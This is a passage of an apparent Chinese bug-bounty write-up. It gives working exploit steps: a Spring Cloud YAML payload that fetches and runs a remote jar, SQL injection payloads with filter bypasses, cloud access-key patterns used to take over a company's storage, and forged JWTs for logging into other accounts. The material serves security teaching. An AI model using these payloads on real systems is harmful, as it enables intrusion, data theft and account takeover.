![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sVsrWxj6GgZ1tsCxKib7zunDoaX3kvtNFKSGuRgZuHibvopblVSlNdacg/640?wx_fmt=png&from=appmsg "null")  
#### 3、刷新配置，DNSlog回显  
  
访问/refresh接口，刷新配置，数据包如下：  
```
POST /refresh HTTP/1.1
Host: 127.0.0.1:9092
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


```  
  
spring 1.x  
```
POST /refresh
Content-Type: application/x-www-form-urlencoded

```  
  
spring 2.x  
```
POST /actuator/refresh
Content-Type: application/json

```  
  
DNSlog成功回显，说明存在RCE漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sBLuJTgzBI7vIAjmp81cpTPw8ubElqiaezbGPLFpYqledDymAcrwDiaKA/640?wx_fmt=png&from=appmsg "null")  
#### 4、RCE漏洞利用  
  
1、payload下载：https://github.com/artsploit/yaml-payload  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sd0P6ibDmRJdweQUQJc9anw5AMLCBYJKqS8XYibGzCic3qjlSsBmzLM3sw/640?wx_fmt=png&from=appmsg "null")  
  
2、打包java成jar执行文件  
  
打包java成jar执行文件之前，修改下src/artsploit/AwesomeScriptEngineFactory.java文件  
```
exec("open -a Calculator")  //macOS弹计算机命令，windows使用calc命令

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sRBePuKGPq0bPMpJLRUiarhCKDCDR3DRftVAs3uGXhx7VPS1b6vHFFbg/640?wx_fmt=png&from=appmsg "null")  
  
把java文件反编译成class文件  
```
javac src/artsploit/AwesomeScriptEngineFactory.java

```  
  
打包jar文件成功  
```
jar -cvf yaml-payload.jar -C src/ .

```  
  
在yaml-payload.jar文件同目录下生成一个exp.yml文件：  
```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://127.0.0.1/yaml-payload.jar"]
  ]]
]

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sJ3dgmcmaib6gfLgiavdDBdN5D6ZuicycJKL2fufT8Cs2rOkEdzHl1pGiaA/640?wx_fmt=png&from=appmsg "null")  
  
3、启动本地服务  
  
在yaml-payload-master目录下，为了后面本地弹计算机的操作  
```
 python -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...

```  
  
4、重新返回bp数据包，修改POST参数  
```
spring.cloud.bootstrap.location=http://127.0.0.1/exp.yml

```  
  
去执行exp.yml文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sqbH4CAda7wlZnShs7O1GKrYJGSKGQ1vhIK8VkdfwC5I0rSKhGoCMsw/640?wx_fmt=png&from=appmsg "null")  
  
5、弹计算机  
  
然后再访问/refresh，刷新并执行exp.yml文件，成功弹计算机  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sSGyyMatHKQTIeLxE8zkTXw2vkyUgSAwibM30hFeGoOEcNGgicVE0ehSA/640?wx_fmt=png&from=appmsg "null")  
## 0x6 阿里云存储接管  
  
这个漏洞想着还是给师傅们分享下，也就是前面介绍资产收集的过程，后面使用转子工具跑JS接口文件中，可以跑出一些敏感接口，里面有一些敏感信息，比如AK/SK，sfz、xm、手机号以及一些接口漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sYWAyI3on18oIQbqLmnticPhSXw9ggAo3WhFlDxvibVQ5yoiaVK20TrF3A/640?wx_fmt=png&from=appmsg "null")  
  
**常见云的ak/sk特征**  
  
下面我给师傅们介绍下常见的几个厂商的 `Access Key` 内容特征，然后就能够根据不同厂商 Key 的不同特征，直接能判断出这是哪家厂商的 `Access Key` ，从而针对性进行渗透测试。其中我们云服务器常见的就是阿里云和腾讯云了，我主要给师傅们介绍下面两种Access Key的特点。  
  
**阿里云**  
  
阿里云 (Alibaba Cloud) 的 Access Key 开头标识一般是 "`LTAI`"。  
  
^LTAI[A-Za-z0-9]{12,20}$  
- **Access Key ID**  
长度为16-24个字符，由大写字母和数字组成。  
  
- **Access Key Secret**  
长度为30个字符，由大写字母、小写字母和数字组成。  
  
**腾讯云**  
  
腾讯云 (Tencent Cloud) 的 Access Key 开头标识一般是 "`AKID`"。  
```
^AKID[A-Za-z0-9]{13,20}$

```  
- SecretId长度为17个字符，由字母和数字组成。  
  
- SecretKey长度为40个字符，由字母和数字组成。  
  
可以使用行云管家进行云服务器接管操作  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2s54MAdHEHUia3hY4ID9ibwHSdbHrI3o1C8G32QZQljGyc4lIbOogEu0FA/640?wx_fmt=png&from=appmsg "null")  
  
使用云存储桶工具登陆，接管云资产  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sh7CdPib4PVpLreiabQHVibnibIXdsGYmcrOh6rTIgFiaiacj2fgYw3Wvzmpw/640?wx_fmt=png&from=appmsg "null")  
  
成功云接管该公司云资产几十个G的内部公司文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2s1pajjyDyk3e8CIbgagwwp53p1Mqia647Pv7iaWSj8NuZmyAEUXDo8zyw/640?wx_fmt=png&from=appmsg "null")  
  
然后使用CF进行云接管操作也是可以的，可以看到目前还是root权限，最高权限，至此该资产全部都拿下了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sly7TlT66ATibianOBbSXAuZd6XFfznWYIsL6aLfkMHCTexO1hCL8vVyg/640?wx_fmt=png&from=appmsg "null")  
## 0x7 前台SQL注入漏洞  
  
一个前台管理系统，通过1/1和1/0进行判断存在SQL注入  
  
然后构造payload如下：  
```
/student_list.php?cid=2/if((length(11))>1,1,0)

```  
- length(11)  
：计算 “11” 的长度（字符串 “11” 的长度为 2）。  
  
- 条件 (length(11))>1  
：即 2>1  
，结果为 **真**  
。  
  
- 因此整个表达式的计算结果为 1  
（满足条件时返回第一个值）。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2suzror6xBfiaMOV6J5xTvlibXkjevTFWIKXibZOYrvek8vBciby5jPiaz8uQ/640?wx_fmt=png&from=appmsg "null")  
```
/student_list.php?cid=2/if((length(1))>1,1,0)

```  
- length(1)  
：计算 “1” 的长度（字符串 “1” 的长度为 1）。  
  
- 条件 (length(1))>1  
：即 1>1  
，结果为**假**  
。  
  
- 因此整个表达式的计算结果为 0（不满足条件时返回第二个值）。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2s1bANYXH87YaIhgzh6J4aD1Xu11NWovCV7uUgU1oUlWHiaxrZY4K6xvA/640?wx_fmt=png&from=appmsg "null")  
  
最后通过判断数据库长度是7  
```
/student_list.php?cid=2/if((length(schema()))>1,1,0)  //正常页面
/student_list.php?cid=2/if((length(schema()))>8,1,0)  //报错

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sDGtOibrGzybpibAicNc6WhbnRXkkB0fdLcCicBUjKLId4HznjQETIyicpEA/640?wx_fmt=png&from=appmsg "null")  
  
针对SQL注入中关键字绕过，下面是waf过滤，对应的常见关键字替换：  
```
schema()  //数据库
database()

@@version  //版本
version()

current_user  //用户名
system_user()
session_user()

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sVyKmOUHWEFz7Kylm2yGnuYWrUzyUZHH7qEGIDHkVkZIYIn4CbSJvEw/640?wx_fmt=png&from=appmsg "null")  
## 0x8 JWT可爆破/未验证签名导致越权  
  
这里使用天眼查网站，去寻找相关企业资产的微信小程序、微信公众号  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sBr7Oy2dI1I4SX2XW2qPZV9PyyB367UlnMXJ4WGppND9W1Whw9Tdqcw/640?wx_fmt=png&from=appmsg "null")  
  
首先通过微信搜索小程序，找到对应目标资产中的小程序系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sq01LUsKhxLn82LyY9bdtX3icE6XTlNJwjj1cCS7xgwVBcY9E1DSB5ibA/640?wx_fmt=png&from=appmsg "null")  
  
然后还有就是需要师傅们关注下微信公众号，很多官方的公众号关注之后，下面都有对应的微信小程序功能，或者跳转到web界面到功能点  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sQG61xNB2H5LRlqfCPyFaCJbGic258hicicueuLtaZRymj5BsoKicdPQa8g/640?wx_fmt=png&from=appmsg "null")  
  
这里来到我们熟悉的微信小程序功能界面，这个时候我们需要一直打开我们的bp抓取小程序的数据包（这个是一个测试小程序的一个好习惯，因为有些接口，包括敏感信息泄露，看历史的数据包很关键），然后看看数据包有没有什么提示，因为这里我的bp安装了HAE，一般重点关注带颜色的数据包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sIucibYzjOWFLHrYGsS4diaND1s4hgz8PezsAGPYocfaqNLI4lybD7K7A/640?wx_fmt=png&from=appmsg "null")  
  
这里我们可以看到bp的历史数据包，显示了多个JSON Web Token也就是大家常说的JWT值，像一般碰到这样的JWT值，我一般都会选择JWT爆破尝试haiy选择有无设置None加密，去进行做一个渗透测试  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2srTKx3qibSDQYFDubXlDyzVGqbjoIBcTJepuyeyGs3mtnQUMIahYWXlQ/640?wx_fmt=png&from=appmsg "null")  
  
这里先直接复制到https://jwt.io/ 去看看这个JWT里面的内容，然后去猜测这个paylod校验哪部分  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2s6Pyib9cJuO8gzktHZW5C8IcAOYF9mM6MCJPmjKu9Pdd4mFmn1KYic9Yg/640?wx_fmt=png&from=appmsg "null")  
  
下面我来给师傅们讲解下这个payload代表什么，一些新手师傅可能没有了解过，包括后面进行数据包替换，也是要修改其中的payload值  
<table><thead><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1px solid rgb(216, 222, 228);"><th data-colwidth="69" style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf=""><br/></span></section></th><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf=""><br/></span></section></th><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf=""><br/></span></section></th></tr></thead><tbody><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1px solid rgb(216, 222, 228);"><td data-colwidth="69"><section style="box-sizing: border-box;margin: 0px 0px 16px;color: rgb(36, 41, 47);font-family: -apple-system, &#34;system-ui&#34;, &#34;Segoe UI&#34;, Helvetica, Arial, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: start;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;"><span leaf="" style="font-size: 15px;">字段名</span></section></td><td><section style="box-sizing: border-box;margin: 0px 0px 16px;color: rgb(36, 41, 47);font-family: -apple-system, &#34;system-ui&#34;, &#34;Segoe UI&#34;, Helvetica, Arial, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: start;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;"><span leaf="" style="font-size: 15px;">值</span></section></td><td><section style="box-sizing: border-box;margin: 0px 0px 16px;color: rgb(36, 41, 47);font-family: -apple-system, &#34;system-ui&#34;, &#34;Segoe UI&#34;, Helvetica, Arial, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: start;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;"><span leaf="" style="font-size: 15px;">说明</span></section></td></tr><tr style="box-sizing: border-box;background-color: rgb(246, 248, 250);border-top: 1px solid rgb(216, 222, 228);"><td data-colwidth="69"><section style="box-sizing: border-box;margin: 0px 0px 16px;color: rgb(36, 41, 47);font-family: -apple-system, &#34;system-ui&#34;, &#34;Segoe UI&#34;, Helvetica, Arial, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: start;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;"><span leaf="" style="font-size: 15px;">role</span></section></td><td><section style="box-sizing: border-box;margin: 0px 0px 16px;color: rgb(36, 41, 47);font-family: -apple-system, &#34;system-ui&#34;, &#34;Segoe UI&#34;, Helvetica, Arial, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: start;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;"><span leaf="" style="font-size: 15px;">appUser</span></section></td><td><section style="box-sizing: border-box;margin: 0px 0px 16px;color: rgb(36, 41, 47);font-family: -apple-system, &#34;system-ui&#34;, &#34;Segoe UI&#34;, Helvetica, Arial, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: start;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;"><span leaf="" style="font-size: 15px;">用户角色，表明用户属于应用层普通用户（非管理员）</span></section></td></tr><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1px solid rgb(216, 222, 228);"><td data-colwidth="69"><section style="box-sizing: border-box;margin: 0px 0px 16px;color: rgb(36, 41, 47);font-family: -apple-system, &#34;system-ui&#34;, &#34;Segoe UI&#34;, Helvetica, Arial, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: start;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;"><span leaf="" style="font-size: 15px;">exp</span></section></td><td><section style="box-sizing: border-box;margin: 0px 0px 16px;color: rgb(36, 41, 47);font-family: -apple-system, &#34;system-ui&#34;, &#34;Segoe UI&#34;, Helvetica, Arial, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: start;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;"><span leaf="" style="font-size: 15px;">1747377338</span></section></td><td><section style="box-sizing: border-box;margin: 0px 0px 16px;color: rgb(36, 41, 47);font-family: -apple-system, &#34;system-ui&#34;, &#34;Segoe UI&#34;, Helvetica, Arial, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: start;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;"><span leaf="" style="font-size: 15px;">令牌过期时间（Unix 时间戳）。通过转换可得具体时间：2025-11-14 11:</span><span leaf="" style="background: url(&#34;https://mmbiz.qpic.cn/mmbiz_png/RZJKsdt2McKm0ggxfibvicgftM8b3KmSVicNkLBMUnJHu71vsoPibRV9xvlEUlOHSYvx7O1bowY5ctHqMvjlBLgXow/640?&amp;wx_fmt=png&#34;) 0% 0% / 375px 198px repeat rgb(255, 255, 255);box-sizing: border-box;color: rgb(36, 41, 47);font-family: -apple-system, &#34;system-ui&#34;, &#34;Segoe UI&#34;, Helvetica, Arial, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: start;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;font-size: 15px;">1</span><span leaf="" style="font-size: 15px;">5:38 UTC</span></section></td></tr><tr style="box-sizing: border-box;background-color: rgb(246, 248, 250);border-top: 1px solid rgb(216, 222, 228);"><td data-colwidth="69"><section style="box-sizing: border-box;margin: 0px 0px 16px;color: rgb(36, 41, 47);font-family: -apple-system, &#34;system-ui&#34;, &#34;Segoe UI&#34;, Helvetica, Arial, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: start;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;"><span leaf="" style="font-size: 15px;">userId</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">xxxxxxxxxxxxxxxxxx</span></section></td><td><section style="box-sizing: border-box;margin: 0px 0px 16px;color: rgb(36, 41, 47);font-family: -apple-system, &#34;system-ui&#34;, &#34;Segoe UI&#34;, Helvetica, Arial, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: start;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;"><span leaf="" style="font-size: 15px;">用于标识用户身份</span></section></td></tr><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1px solid rgb(216, 222, 228);"><td data-colwidth="69"><section style="box-sizing: border-box;margin: 0px 0px 16px;color: rgb(36, 41, 47);font-family: -apple-system, &#34;system-ui&#34;, &#34;Segoe UI&#34;, Helvetica, Arial, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: start;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;"><span leaf="" style="font-size: 15px;">user\_key</span></section></td><td><section style="box-sizing: border-box;margin: 0px 0px 16px;color: rgb(36, 41, 47);font-family: -apple-system, &#34;system-ui&#34;, &#34;Segoe UI&#34;, Helvetica, Arial, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: start;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;"><span leaf="" style="font-size: 15px;">xxxxx-xxxx-xxxx-xxxx</span></section></td><td><section style="box-sizing: border-box;margin: 0px 0px 16px;color: rgb(36, 41, 47);font-family: -apple-system, &#34;system-ui&#34;, &#34;Segoe UI&#34;, Helvetica, Arial, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: start;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;"><span leaf="" style="font-size: 15px;">用户密钥或关联密钥（可能用于访问控制或加密）。</span></section></td></tr><tr style="box-sizing: border-box;background-color: rgb(246, 248, 250);border-top: 1px solid rgb(216, 222, 228);"><td data-colwidth="69"><section style="box-sizing: border-box;margin: 0px 0px 16px;color: rgb(36, 41, 47);font-family: -apple-system, &#34;system-ui&#34;, &#34;Segoe UI&#34;, Helvetica, Arial, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: start;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;"><span leaf="" style="font-size: 15px;">username</span></section></td><td><section style="box-sizing: border-box;margin: 0px 0px 16px;color: rgb(36, 41, 47);font-family: -apple-system, &#34;system-ui&#34;, &#34;Segoe UI&#34;, Helvetica, Arial, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: start;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;"><span leaf="" style="font-size: 15px;">1xxxxxxxxx79</span></section></td><td><section style="box-sizing: border-box;margin: 0px 0px 16px;color: rgb(36, 41, 47);font-family: -apple-system, &#34;system-ui&#34;, &#34;Segoe UI&#34;, Helvetica, Arial, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: start;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;"><span leaf="" style="font-size: 15px;">手机号，一键微信登陆的</span></section></td></tr></tbody></table>  
这里先使用自己修改的JWT脚本爆破工具，看看能不能爆破出密钥  
  
爆破发现其密钥为123456  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sl4jh5vQRZeJzn65UDkdvcicibCohYlgx3gd3NHibuFhmibibqiaOCRa9PXrQ/640?wx_fmt=png&from=appmsg "null")  
  
然后直接来到刚才JWT的网站，去利用该key构造JWT，可以直接进入后台，下面的勾需要勾上  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2stS8xuEDj8iapajdibpialKOagniatanfT9txrHZktfQAPrTpeNGfRa46yw/640?wx_fmt=png&from=appmsg "null")  
  
因为这里我经过测试，这个网站的JWT是对user_key进行校验，所以只要在规定时间内user_key不过期，那么我们就可以拿另外一个手机号进行测试，替换bp抓取登陆口的数据包，然后放包就可以直接登陆别的账号  
  
首先这里需要修改下时间戳，拿这个网站：https://tool.lu/timestamp/ 一般都是改成第二天的时间，不可以早于测试时间  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2svXtW69jOeO70DVxLD92u3ExzFnbMFZIUibUsHcFaicjWmycib0qX5vzVA/640?wx_fmt=png&from=appmsg "null")  
  
还有就是把username替换下，这里我做测试，替换我的卡二，也就是最后面说93的尾号，因为经过测试，普通用户的role 都是appuser，这里猜测管理员可能是admin  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sSMpFUlV5PYbeTNFqu2YBq2KzsEDV3kMoNux8XlTEOEHupQIlpfH7Ew/640?wx_fmt=png&from=appmsg "null")  
  
然后直接在小程序登陆口，使用bp抓包，然后劫持数据包，进行替换token值，因为这里经过测试是校验的JWT值  
  
通过不断替换JWT值，然后不断测试放包，放包，最后面可以直接不需要使用账号密码，直接登陆改账号  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sJiaJPz3EicSpRzEAMQocI1Gibs4wMKmZXqhq5bYyvSwTibQV2BTYxOBWJQ/640?wx_fmt=png&from=appmsg "null")  
## 0x9 隐私合规漏洞  
### 一、SRC的隐私合规介绍  
  
写文章写到这里，突然翻到了之前的笔记，看了下隐私合规漏洞的内容，然后上网搜了下，相关资料比较少，这里就给师傅们拓展下隐私合规漏洞。  
  
像很多小程序和APP应用，都有这个隐私合规的东西  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sNBjiab1Cs8bIlwibc6ZRxUKIpn7P8zZ0fULJtrUaJOhuKPGjVu7Uu0Jg/640?wx_fmt=png&from=appmsg "null")  
  
隐私合规，就是国家出台的对互联网公司的一个法律规范，防止 app 没有做好对用户的隐私合规性做出的规定，如果发现有公司的 app 没有按照要去要做，就会对该公司进行处罚，因此很多 src 会收取隐私合规漏洞。  
  
比如：对于是否收取隐私合规漏洞，需要看他们的公告，如果没有写，那就一般不收取，如果写了隐私合规方面，并且还有奖励标准，那就收取！  
  
下面拿小米SRC的隐私合规的公告给师傅们分享下：https://sec.xiaomi.com/#/notice/detail/221  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2siaEdWR3hCNRoyNTiaOxh99Iv248iaMm40VSlXRn0wXQRh8wKTE5T7ohVQ/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sjl8V4e23GaibIvyXFUObL8Ww67wEdeMk5GCt1mdeZxeh3Z2tz4v2qQA/640?wx_fmt=png&from=appmsg "null")  
  
就比如说下面的这几个小截屏，是不是我们平常在APP和小程序非常常见的一些弹窗提示，但是有些APP和小程序不提示这样的授权权限，而是非授权读取手机敏感个人信息，那么就违反了隐私合规，可以进行相关平台提交安全漏洞。  
  
